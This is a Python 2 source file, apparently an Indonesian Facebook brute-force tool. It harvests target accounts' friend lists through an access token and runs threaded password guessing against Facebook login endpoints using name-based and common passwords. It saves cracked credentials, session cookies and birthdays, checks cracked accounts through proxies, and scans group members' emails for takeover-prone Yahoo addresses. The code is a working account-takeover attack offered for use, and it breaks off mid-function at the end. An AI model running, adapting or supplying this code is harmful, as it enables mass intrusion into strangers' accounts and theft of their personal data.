#!/usr/bin/python
# coding=utf-8
# pashakun.com

#Import module
import os,sys,time,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib
from multiprocessing.pool import ThreadPool
try:
	import mechanize
except ImportError:
	os.system("pip2 install mechanize")
try:
	import requests
except ImportError:
	os.system("pip2 install requests")
from requests.exceptions import ConnectionError
from mechanize import Browser
import os
import os
import sys
import time
import datetime
import random
import hashlib
import re
import threading
import json
import urllib
import cookielib
import requests
import uuid
import ipaddress
import base64
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from time import sleep
import os, sys, re, time, requests, calendar, random
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as parser
from datetime import datetime
from datetime import date
try:
	import requests
except ImportError:
	print '[×] Modul requests belum terinstall!...\n'
	os.system('pip install requests' if os.name == 'nt' else 'pip2 install requests')
reload(sys)
sys.setdefaultencoding('utf8')
ip = requests.get('https://api.ipify.org').text

MAX_IPV4 = ipaddress.IPv4Address._ALL_ONES  # 2 ** 32 - 1
MAX_IPV6 = ipaddress.IPv6Address._ALL_ONES  # 2 ** 128 - 1

def random_ipv4():
	return  ipaddress.IPv4Address._string_from_ip_int(random.randint(0, MAX_IPV4))
def random_ipv6():
	return ipaddress.IPv6Address._string_from_ip_int(random.randint(0, MAX_IPV6))

#-Setting-#
########
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent','Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

#-Keluar-#
def keluar():
	print "\033[1;91m[!] Exit"
	os.sys.exit()
	
#-Warna-#
def acak(x):
    w = 'mhkbpcP'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)
    
def cetak(x):
    w = 'mhkbpcP'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')
	
#-Animasi-#
def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(00000.1)
		
##### LOGO #####
logo = """
\033[1;35m╔═════════════════════════════════════════════════╗
\033[1;36m║\033[1;32m ___ ___              _____ _____________________\033[1;36m║
\033[1;36m║\033[1;32m /   |   \            /     \\______   \_   _____/\033[1;36m║
\033[1;36m║\033[1;32m/    ~    \  ______  /  \ /  \|    |  _/|    __)\033[1;36m ║
\033[1;36m║\033[1;32m\    Y    / /_____/ /    Y    \    |   \|     \ \033[1;36m ║
\033[1;36m║\033[1;32m \___|_  /          \____|__  /______  /\___  / \033[1;36m ║
\033[1;35m╚═════════════════════════════════════════════════╝
\033[1;36m- H 4 M Z - MULTI  - B R U T E - F O R C E -
\033[1;31m╔════════════════════════════════════════════╗
\033[1;31m║\033[1;32m* \033[1;93mAuthor  \033[1;93m: \033[1;37mIlham Ramadhan         \033[1;31m         ║
\033[1;31m║\033[1;32m* \033[1;93mGitHub  \033[1;93m: \033[1;37m\033[4mhttps://github.com/ilhamxyz213\033[0m \033[1;31m ║
\033[1;31m║\033[1;32m* \033[1;93mFacebook\033[1;93m: \033[1;37m\033[4mFacebook.com/ilhamxv.231\033[0m \033[1;31m       ║
\033[1;31m╚════════════════════════════════════════════╝"""
id = []
cp = []
ok = []
loop = 0
s = requests.Session()
rgb = random.choice(['\x1b[0;91m', '\x1b[0;92m', '\x1b[0;93m', '\x1b[0;94m', '\x1b[0;95m', '\x1b[0;96m', '\x1b[0;97m', '\x1b[0m'])
ua = s.get("https://raw.githubusercontent.com/Dumai-200/Server-Dmbf/main/ua.txt").text.strip()
ip = s.get('https://api-asutoolkit.cloudaccess.host/ip.php').text

ct = datetime.now()
n = ct.month
bulan = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"]
try:
	if n < 0 or n > 12:
		exit() 
	nTemp = n - 1
except ValueError:
	exit()

current = datetime.now()
ta = current.year
bu = current.month
ho = current.day
op = bulan[nTemp]

my_date = date.today()
hr = calendar.day_name[my_date.weekday()]
tanggal = ("%s-%s-%s-%s"%(hr, ho, op, ta))
tgl = ("%s %s %s"%(ho, op, ta))
bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}

useragents = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.117 Mobile Safari/537.36 Instagram 138.0.0.28.117 Android (29/10; 440dpi; 1080x2210; Xiaomi; Mi 9T Pro; raphael; qcom; fr_FR; 210180522)'

# titik #
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;91m[●] \033[1;92mLoading \033[1;97m"+o),;sys.stdout.flush();time.sleep(1)

back = 0
threads = []
berhasil = []
cekpoint = []
oks = []
gagal = []
idteman = []
idfromteman = []
idmem = []
emmem = []
nomem = []
id = []
em = []
emfromteman = []
hp = []
hpfromteman = []
reaksi = []
reaksigrup = []
komen = []
komengrup = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

##### LICENSE #####
#=================#
def lisensi():
	try:
		toket = open('licensed.log','r').read()
	except IOError:
		print("\x1b[91m  License Invalid\x1b[0m !");time.sleep(2)
		os.system('clear')
		os.system('rm -rf licensed.log')
		user()
	if os.path.exists('licensed.log'): 
		user1()
	else:
		user()
def user():
    os.system('clear')
    print logo
    print(45*"_")
    print ('  [+]Generating ID ...');time.sleep(3)
    print ("  [+]SUCCES");time.sleep(0.07)
    masuk()
    id = uuid.uuid4().hex[:25] ## hex 20 change to 25
    idg = open('licensed.log', 'w')
    idg.write(id)
    idg.close()
    print ("  [+]YOUR ID : "+ id);time.sleep(0.07)
    print ('  [+]Your ID Has Not Been Confirmed');time.sleep(0.07)
    print ('  [+]Please Contact Admin for ID Confirmation');time.sleep(0.07)
    raw_input ('  Press Enter to Chat Admin');time.sleep(0.07)
    os.system('am start https://wa.me/+6285722391529?text=Konfirmasi%20Saya%20Dengan%20ID:%20' + id + ' >/dev/null')
    time.sleep(1)
    os.sys.exit()
def user1():
    try:
      j = open('licensed.log', 'r').read()
      r = requests.get("https://github.com/Ilhamxyz213/hmbf/blob/main/license.txt").text # ganti pake link github kontol ok waduk sia ruhay
      if j in r:
          os.system("clear")
          print logo
          print("  Login Status : \x1b[92mComplete\x1b[0m")
          time.sleep(1)
          return
      else:
          os.system("clear")
          print logo
          print ('  [!]Login Status :\x1b[91m Failed \x1b[0m');time.sleep(0.07)
          print ('  [+]ID Not Confirmed');time.sleep(0.07)
          print ('  [+]Please Chat Admin For Confirmed Your ID');time.sleep(0.07)
          raw_input ('  Press Enter To Chat Admin');time.sleep(0.07)
          os.system('am start https://wa.me/6289625664339?text=Tolong%20konfirmasi%20saya%20dengan%20ID:%20' + j + ' >/dev/null')
          os.sys.exit()
    except requests.exceptions.ConnectionError:
      print ('  \x1b[91mNo Connection')
      input('  \x1b[0m Back')
      spt()
    except KeyboardInterrupt:
      os.sys.exit()
    except IOError:
      subprocess.Popen(['rm', '-rf', 'licensed.log'])
      user()

#------->login token jangan lupa masukin token facebook jangan token listrik kontol<-------#    
def masuk():
	os.system('clear')
	try:
		token = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
		print logo
		print ' \033[0;99m[ Ketik help Untuk Mendapatkan Token ]'
		token = raw_input(" \033[0;98m[•]  token : ")
		if token == "help":
			os.system("xdg-open https://free.facebook.com/100008065235213/posts/3002983643313781/?app=fbl")
			exit(" ! Jangan Lupa React Love wak:v")
		try:
			otw = requests.get('https://graph.facebook.com/me?access_token='+token)
			a = json.loads(otw.text)
			zedd = open("login.txt", 'w')
			zedd.write(token)
			zedd.close()
			print (" √  login berhasil ")
			hamz_bot()
		except KeyError:
			print (" [!] Token Invalid") 
			sys.exit()
			
##### MENU ##########################################
def menu():
	os.system('clear')
	global token
	try:
		token = open('login.txt','r').read()
		otw = requests.get('https://graph.facebook.com/me/?access_token='+token)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
	except KeyError:
		os.system('clear')
		print (' [!] Token Invalid')
		os.system("rm -f login.txt")
		lisensi()
	os.system("clear")
	print logo
	print "║\033[1;91m[\033[1;96m✓\033[1;91m]\033[1;97m Name \033[1;91m: \033[1;92m"+nama+"\033[1;97m"
	print "║\033[1;91m[\033[1;96m✓\033[1;91m]\033[1;97m ID   \033[1;91m: \033[1;92m"+id
	print "\033[1;97m╚"+40*"═"
	print "\033[1;94m║--\033[1;91m> \033[1;93m1.\033[1;95m User information"
	print "\033[1;94m║--\033[1;91m> \033[1;93m2.\033[1;95m Crack Account               "
	print "\033[1;94m║--\033[1;91m> \033[1;93m3.\033[1;95m Bot       "
	print "\033[1;94m║--\033[1;91m> \033[1;93m4.\033[1;95m Others           "
	print "\033[1;94m║--\033[1;91m> \033[1;93m5.\033[1;95m Cek Hasil Crack           "
	print "\033[1;94m║--\033[1;91m> \033[1;93m6.\033[1;95m Cek Opsi          "
	print "\033[1;94m║--\033[1;91m> \033[1;93m7.\033[1;95m LogOut            "
	print "\033[1;94m║--\033[1;91m> \033[1;93m0.\033[1;95m Exit the programs          "
	print "║"
	pilih()
#-
def pilih():
	zedd = raw_input("\033[1;97m╚═\033[1;91mD \033[1;97m")
	if zedd =="":
		print "\033[1;91m[!] Wrong input"
		pilih()
	elif zedd =="1":
		informasi()
	elif zedd =="2":
		menu_hack()
	elif zedd =="3":
		menu_bot()
	elif zedd =="4":
		lain()
	elif zedd =="5":
		print("\n [1] cek hasil crack OK")
		print(" [2] cek hasil crack CP")
		cek = raw_input("\n [?] choose : ")
		if cek =="":
			menu()
		elif cek == "1":
			dirs = os.listdir("OK")
			print(" [*] list nama file tersimpan di folder OK\n")
			for file in dirs:
				print(" [+] "+file)
			try:
				file = raw_input("\n [?] pilih nama file : ")
				if file == "":
					menu()
				totalok = open("OK/%s"%(file)).read().splitlines()
			except IOError:
				exit(" [!] file %s tidak tersedia"%(file))
			nm_file = ("%s"%(file)).replace("-", " ")
			del_txt = nm_file.replace(".txt", "")
			print(" [#] ----------------------------------------------")
			print(" [+] hasil crack : %s total : %s\033[0;92m"%(del_txt, len(totalok)))
			os.system("cat OK/%s"%(file))
			print("\033[0;97m [#] ----------------------------------------------")
			exit(" [!] jangan lupa di copy dan di simpan hasilnya")
		elif cek == "2":
			dirs = os.listdir("CP")
			print(" [*] list nama file tersimpan di folder CP\n")
			for file in dirs:
				print(" [+] "+file)
			try:
				file = raw_input("\n [?] pilih nama file : ")
				if file == "":
					menu()
				totalcp = open("CP/%s"%(file)).read().splitlines()
			except IOError:
				exit(" [!] file %s tidak tersedia"%(file))
			nm_file = ("%s"%(file)).replace("-", " ")
			del_txt = nm_file.replace(".txt", "")
			print(" [#] ----------------------------------------------")
			print(" [+] hasil crack : %s total : %s\033[0;93m"%(del_txt, len(totalcp)))
			os.system("cat CP/%s"%(file))
			print("\033[0;97m [#] ----------------------------------------------")
			exit(" [!] jangan lupa di copy dan di simpan hasilnya")
		else:
			menu()
	elif zedd =="6":
		cekopsi()
	elif zedd =="7":
		os.system('rm -rf login.txt')
		os.system('xdg-open https://www.pashakun.com')
		keluar()
	elif zedd =="0":
		keluar()
	else:
		print "\033[1;91m[!] Wrong input"
		pilih()
	
	

##### INFO #####
def informasi():
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('reset')
	print logo
	aid = raw_input('\033[1;91m[+] \033[1;92mEnter ID\033[1;97m/\033[1;92mName\033[1;91m : \033[1;97m')
	jalan('\033[1;91m[✺] \033[1;92mWait a minute \033[1;97m...')
	r = requests.get('https://graph.facebook.com/me/friends?access_token='+toket)
	cok = json.loads(r.text)
	for i in cok['data']:
		if aid in i['name'] or aid in i['id']:
			x = requests.get("https://graph.facebook.com/"+i['id']+"?access_token="+toket)
			z = json.loads(x.text)
			print 42*"\033[1;97m═"
			try:
				print '\033[1;91m[➹] \033[1;92mName\033[1;97m          : '+z['name']
			except KeyError: print '\033[1;91m[?] \033[1;92mName\033[1;97m          : \033[1;91mNot found'
			try:
				print '\033[1;91m[➹] \033[1;92mID\033[1;97m            : '+z['id']
			except KeyError: print '\033[1;91m[?] \033[1;92mID\033[1;97m            : \033[1;91mNot found'
			try:
				print '\033[1;91m[➹] \033[1;92mEmail\033[1;97m         : '+z['email']
			except KeyError: print '\033[1;91m[?] \033[1;92mEmail\033[1;97m         : \033[1;91mNot found'
			try:
				print '\033[1;91m[➹] \033[1;92mTelephone\033[1;97m     : '+z['mobile_phone']
			except KeyError: print '\033[1;91m[?] \033[1;92mTelephone\033[1;97m     : \033[1;91mNot found'
			try:
				print '\033[1;91m[➹] \033[1;92mLocation\033[1;97m      : '+z['location']['name']
			except KeyError: print '\033[1;91m[?] \033[1;92mLocation\033[1;97m      : \033[1;91mNot found'
			try:
				print '\033[1;91m[➹] \033[1;92mDate of birth\033[1;97m : '+z['birthday']
			except KeyError: print '\033[1;91m[?] \033[1;92mDate of birth\033[1;97m : \033[1;91mNot found'
			try:
				print '\033[1;91m[➹] \033[1;92mSchool\033[1;97m        : '
				for q in z['education']:
					try:
						print '\033[1;91m                   ~ \033[1;97m'+q['school']['name']
					except KeyError: print '\033[1;91m                   ~ \033[1;91mNot found'
			except KeyError: pass
			raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
			menu()
		else:
			pass
	else:
		print"\033[1;91m[✖] User not found"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		menu()

##### MENU HACK #####
def menu_hack():
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('reset')
	print logo
	print "\033[1;93m║--\033[1;93m> \033[1;93m1.\033[1;94m Crack Dari ID Publick"
	print "\033[1;93m║--\033[1;93m> \033[1;93m2.\033[1;94m Yahoo Checker"
	print "\033[1;93m║--\033[1;93m> \033[1;93m0.\033[1;94m Back"
	print "║"
	hack_pilih()
#----pilih
def hack_pilih():
	hack = raw_input("\033[1;95m╚═\033[1;95mD \033[1;95m")
	if hack=="":
		print "\033[1;91m[!] Wrong input"
		hack_pilih()
	elif hack =="1":
		publik()
	elif hack =="2":
		menu_yahoo()
	elif hack =="0":
		menu()
	else:
		print "\033[1;91m[!] Wrong input"
		hack_pilih()
		
### PUBLICK ###
def publik():
	global token
	try:
		token = open("login.txt", "r").read()
	except IOError:
		exit(" [!] token kadaluwarsa")
	print("\n \033[0;91m[•] isi 'me' jika ingin dari daftar teman")
	idt = raw_input(" \033[0;91m[•] id target : ")
	try:
		for i in requests.get("https://graph.facebook.com/%s/friends?access_token=%s"%(idt, token)).json()["data"]:
			uid = i["id"]
			nama = i["name"].rsplit(" ")[0]
			id.append(uid+"<=>"+nama)
	except KeyError:
		exit(" [•] akun tidak tersedia atau list teman private")
	print(" [+] total id  : \033[0;91m%s\033[0;91m"%(len(id)))
	ask = raw_input(" [•] gunakan password manual? y/t: ")
	if ask == "y":
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n [*] contoh pass : sayang,anjing,bangsat")
				asu = raw_input(" [?] set pass : ").split(",")
				if len(asu) =="":
					exit(" [!] jangan kosong")
				print("\n [+] hasil OK tersimpan di : OK/%s.txt"%(tanggal))
				print(" [+] hasil CP tersimpan di : CP/%s.txt\n"%(tanggal))
				print(" [!] jika tidak ada hasil hidupkan mode pesawat 5 detik\n")
				for user in id:
					uid, name = user.split("<=>")
					coeg.submit(api, uid, asu)
			exit("\n\n [#] crack selesai...")
	elif ask == "t":
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n [+] hasil OK tersimpan di : OK/%s.txt"%(tanggal))
				print(" [+] hasil CP tersimpan di : CP/%s.txt\n"%(tanggal))
				print(" [!] jika tidak ada hasil hidupkan mode pesawat 5 detik\n")
				for user in id:
					uid, name = user.split("<=>")
					if len(name)>=6:
						pwx = [ name+"123", name+"12345" ]
					elif len(name) == 3 or len(name) == 4 or len(name) == 5:
						pwx = [ name+"123", name+"12345" ]
					else:
						pwx = [ "katasandi","sayangku","sayang","doraemon","bismillah" ]
					coeg.submit(api, uid, pwx)
			exit("\n\n [#] crack selesai...")

def api(uid, pwx):
	try:
		ua = open(".ua", "r").read()
	except IOError:
		ua = ("Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]")
	global ok, cp, loop, token
	sys.stdout.write(
		"\r [*] crack %s/%s ok:-%s - cp:-%s "%(loop, len(id), len(ok), len(cp))
	); sys.stdout.flush()
	for pw in pwx:
		pw = pw.lower()
		ses = requests.Session()
		headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
		send = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_)
		if "session_key" in send.text and "EAAA" in send.text:
			print("\r  \033[0;92m👉OK👈 %s|%s|%s\033[0;97m"%(uid, pw, send.json()["access_token"]))
			ok.append("%s|%s"%(uid, pw))
			open("OK/%s.txt"%(tanggal),"a").write("  👉OK👈 %s|%s\n"%(uid, pw))
			break
		elif "www.facebook.com" in send.json()["error_msg"]:
			try:
				token = open("login.txt", "r").read()
				with requests.Session() as ses:
					ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
					month, day, year = ttl.split("/")
					month = bulan_ttl[month]
					print("\r  \033[0;93m👉CP👈 %s|%s|%s %s %s\033[0;97m"%(uid, pw, day, month, year))
					cp.append("%s|%s"%(uid, pw))
					open("CP/%s.txt"%(tanggal),"a").write("  👉CP👈 %s|%s|%s %s %s\n"%(uid, pw, day, month, year))
					break
			except (KeyError, IOError):
				day = (" ")
				month = (" ")
				year = (" ")
			except:pass
			print("\r  \033[0;93m👉CP👈 %s|%s\033[0;97m        "%(uid, pw))
			cp.append("%s|%s"%(uid, pw))
			open("CP/%s.txt"%(tanggal),"a").write("  👉CP👈 %s|%s\n"%(uid, pw))
			break
		else:
			continue

	loop += 1

def crack(uid, pwx, host, **kwargs):
	try:
		ua = open(".ua", "r").read()
	except IOError:
		ua = ("Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]")
	global ok, cp, loop, token
	sys.stdout.write(
		"\r [*] crack %s/%s ok:-%s - cp:-%s "%(loop, len(id), len(ok), len(cp))
	); sys.stdout.flush()
	try:
		for pw in pwx:
			kwargs = {}
			pw = pw.lower()
			ses = requests.Session()
			ses.headers.update({"origin": host, "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "".join(bs4.re.findall("://(.*?)$",host)), "referer": host+"/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
			p = ses.get(host+"/login/?next&ref=dbl&refid=8").text
			b = parser(p,"html.parser")
			bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
			for i in b("input"):
				try:
					if i.get("name") in bl:kwargs.update({i.get("name"):i.get("value")})
					else:continue
				except:pass
			kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
			gaaa = ses.post(host+"/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=kwargs)
			if "c_user" in ses.cookies.get_dict().keys():
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
				print("\r  \033[0;92m* --> %s|%s|%s\033[0;97m"%(uid, pw, kuki))
				ok.append("%s|%s"%(uid, pw))
				open("OK/%s.txt"%(tanggal),"a").write("  * --> %s|%s\n"%(uid, pw))
				break
			elif "checkpoint" in ses.cookies.get_dict().keys():
				try:
					token = open("login.txt", "r").read()
					with requests.Session() as ses:
						ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
						month, day, year = ttl.split("/")
						month = bulan_ttl[month]
						print("\r  \033[0;93m* --> %s|%s|%s %s %s\033[0;97m"%(uid, pw, day, month, year))
						cp.append("%s|%s"%(uid, pw))
						open("CP/%s.txt"%(tanggal),"a").write("  * --> %s|%s|%s %s %s\n"%(uid, pw, day, month, year))
						break
				except (KeyError, IOError):
					day = (" ")
					month = (" ")
					year = (" ")
				except:pass
				print("\r  \033[0;93m* --> %s|%s\033[0;97m        "%(uid, pw))
				cp.append("%s|%s"%(uid, pw))
				open("CP/%s.txt"%(tanggal),"a").write("  * --> %s|%s\n"%(uid, pw))
				break
			else:
				continue

		loop+=1
	except Exception as e:
		if "free.facebook.com" in host:
			return crack(uid, pwx, host)
		else:
			return crack(uid, pwx, "https://free.facebook.com")
			
### CEK OPSI ###
from bs4 import BeautifulSoup as parser
def cekopsi():
	print("\n\033[0;96m [*] Masukan Nama format out/cp\033[0m")
	files = raw_input(" [?] nama file  : ")
	if files == "":
		menu()
	try:
		buka_baju = open(files, "r").readlines()
	except IOError:
		exit("\n [!] nama file %s tidak tersedia"%(files))
	print(" [+] total akun : \033[0;91m%s\033[0;97m"%(len(buka_baju)))
	print(" [*] sedang prosess cek akun....")
	for memek in buka_baju:
		kontol = memek.replace("\n","")
		titid  = kontol.split("|")
		print("\n [+] cek akun : \033[0;93m%s\033[0;97m"%(kontol.replace("  * --> ","")))
		try:
			check_in(titid[0].replace("  * --> ",""), titid[1])
		except requests.exceptions.ConnectionError:
			pass
	print("\n [!] cek akun sudah selesai...")
	raw_input(" [+] pencet enter untuk kembali ke menu ")
	time.sleep(1)
	menu()
def check_in(user, pasw):
	mb = ("https://mbasic.facebook.com")
	ua = "Mozilla/5.0 (Linux; Android 9; LYA-AL00 Build/HUAWEILYA-AL00) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/323.0.0.46.119;]"
	http_proxy='http://36.94.23.154'
	https_proxy='https://103.36.35.135'
	http_proxy='http://36.92.70.209'
	https_proxy='https://110.232.74.55'
	http_proxy='http://182.23.107.210'
	https_proxy='https://36.66.19.10'
	ses = requests.Session()
	#-> pemisah
	ses.headers.update({"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": mb,"content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": mb+"/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	data = {}
	ged = parser(ses.get(mb+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
	fm = ged.find("form",{"method":"post"})
	list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
	for i in fm.find_all("input"):
		if i.get("name") in list:
			data.update({i.get("name"):i.get("value")})
		else:
			continue
	data.update({"email":user,"pass":pasw})
	run = parser(ses.post(mb+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
	if "c_user" in ses.cookies:
		kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
		run = parser(ses.get("https://free.facebook.com/settings/apps/tabbed/", cookies={"cookie":kuki}).text, "html.parser")
		xe = [re.findall("\<span.*?href=\".*?\">(.*?)<\/a><\/span>.*?\<div class=\".*?\">(.*?)<\/div>", str(td)) for td in run.find_all("td", {"aria-hidden":"false"})][2:]
		print(" [+] aplikasi terhubung ada : "+str(len(xe)))
		num = 0
		for _ in xe:
			num += 1
			print("   "+str(num)+" "+_[0][0]+", "+_[0][1])
	elif "checkpoint" in ses.cookies:
		form = run.find("form")
		dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
		jzst = form.find("input",{"name":"jazoest"})["value"]
		nh   = form.find("input",{"name":"nh"})["value"]
		dataD = {"fb_dtsg": dtsg,"fb_dtsg": dtsg,"jazoest": jzst,"jazoest": jzst,"checkpoint_data":"","submit[Continue]":"Lanjutkan","nh": nh}
		xnxx = parser(ses.post(mb+form["action"], data=dataD).text, "html.parser")
		ngew = [yy.text for yy in xnxx.find_all("option")]
		if(str(len(ngew))=="0"):
			print(" \033[0;32m[√] Cek Lewat Fb Lite Ya... Sayank 😘😘😘")
		else:
			print(" [!] terdapat %s opsi "%(str(len(ngew))))
		opsi =[]
		for opt in range(len(ngew)):
			print(" ["+str(opt+1)+"] "+ngew[opt])
	elif "login_error" in str(run):
		oh = run.find("div",{"id":"login_error"}).find("div").text
		print(" [!] %s"%(oh))
	else:
		print(" [!] login gagal, silahkan cek kembali id dan password")
	if os.path.exists("cp.txt"): pass 
	else: open("cp.txt","a").close() 
	if os.path.exists("ok.txt"): pass 
	else: open("ok.txt","a").close()
	
	
##### YAHOO MEMBER #####
def yahoomember():
	global toket
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		os.mkdir('out')
	except OSError:
		pass
	os.system('reset')
	print logo
	mpsh = []
	jml = 0
	id=raw_input('\033[1;91m[+] \033[1;92mInput ID group \033[1;91m:\033[1;97m ')
	try:
		r=requests.get('https://graph.facebook.com/group/?id='+id+'&access_token='+toket)
		asw=json.loads(r.text)
		print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mFrom group \033[1;91m:\033[1;97m "+asw['name']
	except KeyError:
		print"\033[1;91m[!] Group not found"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		menu_yahoo()
	jalan('\033[1;91m[✺] \033[1;92mGetting email from group \033[1;97m...')
	teman = requests.get('https://graph.facebook.com/'+id+'/members?fields=name,id&limit=999999999&access_token='+toket)
	kimak = json.loads(teman.text)
	save = open('out/GrupMailVuln.txt','w')
	jalan('\033[1;91m[✺] \033[1;92mStart \033[1;97m...')
	print 42*"\033[1;97m═"
	for w in kimak['data']:
		jml +=1
		mpsh.append(jml)
		id = w['id']
		nama = w['name']
		links = requests.get("https://graph.facebook.com/"+id+"?access_token="+toket)
		z = json.loads(links.text)
		try:
			mail = z['email']
			yahoo = re.compile(r'@.*')
			otw = yahoo.search(mail).group()
			if 'yahoo.com' in otw:
				br.open("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")
				br._factory.is_html = True
				br.select_form(nr=0)
				br["username"] = mail
				klik = br.submit().read()
				jok = re.compile(r'"messages.ERROR_INVALID_USERNAME">.*')
				try:
					pek = jok.search(klik).group()
				except:
					continue
				if '"messages.ERROR_INVALID_USERNAME">' in pek:
					save.write(mail + '\n')
					print("\033[1;97m[ \033[1;92mVULN✓\033[1;97m ] \033[1;92m" +mail+" \033[1;97m=>"+nama)
					berhasil.append(mail)
		except KeyError:
			pass
	print 42*"\033[1;97m═"
	print '\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mDone \033[1;97m....'
	print"\033[1;91m[+] \033[1;92mTotal \033[1;91m: \033[1;97m"+str(len(berhasil))
	print"\033[1;91m[+] \033[1;92mFile saved \033[1;91m:\033[1;97m out/GrupMailVuln.txt"
	save.close()
	raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
	menu_yahoo()
		
##### YAHOO FILE #####
def yahoolist():
	global toket
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		os.mkdir('out')
	except OSError:
		pass
	os.system('reset')
	print logo
